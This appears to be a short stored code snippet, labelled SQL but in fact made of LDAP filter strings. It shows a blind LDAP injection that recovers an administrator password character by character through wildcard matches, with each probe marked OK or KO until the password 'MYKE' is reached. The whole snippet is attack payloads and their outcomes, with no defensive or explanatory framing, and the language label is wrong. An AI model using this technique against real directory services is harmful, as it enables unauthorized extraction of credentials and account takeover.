---
id: 687c03dc-31d4-4cc3-b0d8-9b90f1b2521a
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:01.631446+00:00'
updated_at: '2023-04-10T20:36:28.746415+00:00'
---

# Code Snippet 687c03dc

**Language**: SQL

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```
